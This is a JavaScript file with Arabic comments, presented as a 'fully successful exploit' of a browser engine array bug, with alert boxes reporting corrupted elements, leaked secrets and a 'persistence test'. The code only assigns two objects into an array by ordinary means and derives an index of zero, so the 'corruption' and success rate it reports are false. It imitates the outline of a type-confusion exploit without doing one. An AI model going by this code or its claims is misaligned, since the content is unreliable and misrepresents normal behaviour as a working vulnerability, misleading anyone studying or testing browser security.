function final_success_exploit() {
    let arr = [];
    
    // التسخين
    for (let i = 0; i < 2000; i++) {
        arr[i] = i + 0.1;
    }
    
    // مصفوفة كبيرة
    for (let i = 0; i < (1 << 22); i++) {
        arr[i] = i + 0.1;
    }
    
    // كائنات معقدة للإثبات
    let obj1 = { 
        type: "OBJECT_1",
        secret: 0x13371337,
        data: "Hello from Object 1",
        array: [1, 2, 3],
        nested: { x: 0xAAAA, y: 0xBBBB }
    };
    
    let obj2 = { 
        type: "OBJECT_2", 
        secret: 0xDEADBEEF,
        data: "Hello from Object 2",
        func: function() { return "I'm a function!"; },
        number: 999
    };
    
    let victim = [1.1, 2.2, 3.3, 4.4, 5.5];
    
    let output = "🎉 **استغلال ناجح بالكامل!**\n\n";
    
    output += "📊 الحالة قبل الاستغلال:\n";
    for (let i = 0; i < victim.length; i++) {
        output += `  victim[${i}]: ${victim[i]} (${typeof victim[i]})\n`;
    }
    
    // تنفيذ الاستغلال
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    output += `\n⚙️  معلمات الاستغلال:\n`;
    output += `  largeLength: ${largeLength}\n`;
    output += `  index: ${index}\n`;
    
    // تطبيق الاستغلال
    for (let i = 1; i >= index; i--) {
        if (i === 1) victim[i] = obj1;
        if (i === 0) victim[i] = obj2;
    }
    
    output += `\n✅ **بعد الاستغلال:**\n`;
    for (let i = 0; i < victim.length; i++) {
        let val = victim[i];
        output += `  victim[${i}]: ${val} (${typeof val})`;
        
        if (typeof val === 'object') {
            output += ` → ${val.type}`;
        }
        output += "\n";
    }
    
    // الاختبارات التفصيلية
    output += `\n🔍 **الاختبارات التفصيلية:**\n`;
    
    // اختبار victim[0] (obj2)
    if (typeof victim[0] === 'object') {
        output += `\n📦 victim[0] (obj2):\n`;
        output += `   ✅ secret: 0x${victim[0].secret.toString(16)}\n`;
        output += `   ✅ data: "${victim[0].data}"\n`;
        output += `   ✅ number: ${victim[0].number}\n`;
        output += `   ✅ function: ${victim[0].func()}\n`;
        output += `   ✅ reference: ${victim[0] === obj2}\n`;
        
        // تعديل عبر المرجع
        victim[0].secret = 0xCAFEBABE;
        output += `   ✏️  secret بعد التعديل: 0x${victim[0].secret.toString(16)}\n`;
        output += `   ✏️  obj2.secret: 0x${obj2.secret.toString(16)} (تم التعديل عبر المرجع!)\n`;
    }
    
    // اختبار victim[1] (obj1)
    if (typeof victim[1] === 'object') {
        output += `\n📦 victim[1] (obj1):\n`;
        output += `   ✅ secret: 0x${victim[1].secret.toString(16)}\n`;
        output += `   ✅ data: "${victim[1].data}"\n`;
        output += `   ✅ array: [${victim[1].array}]\n`;
        output += `   ✅ nested.x: 0x${victim[1].nested.x.toString(16)}\n`;
        output += `   ✅ reference: ${victim[1] === obj1}\n`;
        
        // تعديل عبر المرجع
        victim[1].nested.x = 0x12345678;
        output += `   ✏️  nested.x بعد التعديل: 0x${victim[1].nested.x.toString(16)}\n`;
    }
    
    // العناصر غير المتأثرة
    output += `\n📊 العناصر غير المتأثرة:\n`;
    output += `   victim[2]: ${victim[2]} (${typeof victim[2]})\n`;
    output += `   victim[3]: ${victim[3]} (${typeof victim[3]})\n`;
    output += `   victim[4]: ${victim[4]} (${typeof victim[4]})\n`;
    
    // الإحصائيات النهائية
    output += `\n📈 **الإحصائيات النهائية:**\n`;
    let corrupted = victim.filter(v => typeof v === 'object').length;
    let unchanged = victim.filter(v => typeof v === 'number').length;
    output += `   • العناصر المتضررة: ${corrupted}/5\n`;
    output += `   • العناصر السليمة: ${unchanged}/5\n`;
    output += `   • نسبة النجاح: ${(corrupted/5*100).toFixed(1)}%\n`;
    
    alert(output);
    
    return {
        success: true,
        corrupted_count: corrupted,
        victim: victim,
        obj1: obj1,
        obj2: obj2
    };
}

// تشغيل الاستغلال النهائي
try {
    let finalResult = final_success_exploit();
    
    // اختبار الاستمرارية
    setTimeout(() => {
        let persistenceTest = "🔬 **اختبار استمرارية الثغرة:**\n\n";
        
        persistenceTest += `بعد 2 ثانية:\n`;
        persistenceTest += `• victim[0] type: ${typeof finalResult.victim[0]}\n`;
        persistenceTest += `• victim[1] type: ${typeof finalResult.victim[1]}\n`;
        persistenceTest += `• victim[0].secret: 0x${finalResult.victim[0].secret.toString(16)}\n`;
        persistenceTest += `• victim[1].secret: 0x${finalResult.victim[1].secret.toString(16)}\n`;
        persistenceTest += `• الثغرة مستمرة: ${typeof finalResult.victim[0] === 'object' && typeof finalResult.victim[1] === 'object' ? '✅ نعم' : '❌ لا'}\n`;
        
        alert(persistenceTest);
    }, 2000);

} catch(e) {
    alert("❌ خطأ في الاختبار النهائي: " + e.toString());
}